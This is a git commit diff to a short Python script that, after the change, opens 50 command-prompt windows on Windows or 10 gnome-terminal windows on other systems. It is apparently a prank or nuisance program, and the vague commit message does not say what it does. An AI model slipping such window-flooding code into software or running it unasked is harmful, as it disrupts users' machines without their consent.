3239ba2bbc85140d1bc04ce50c8bf7cf42a15d26
LiamCrsd <43929554+LiamCrsd@users.noreply.github.com>
2023-02-18 00:45:45 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,7 @@
 import os
-os.system("echo " + os.name)
-for i in range(10):
-  os.system("start")
+if os.name == "nt":
+  for i in range(50):
+    os.system("start")
+else:
+  for i in range(10):
+    os.system("gnome-terminal")
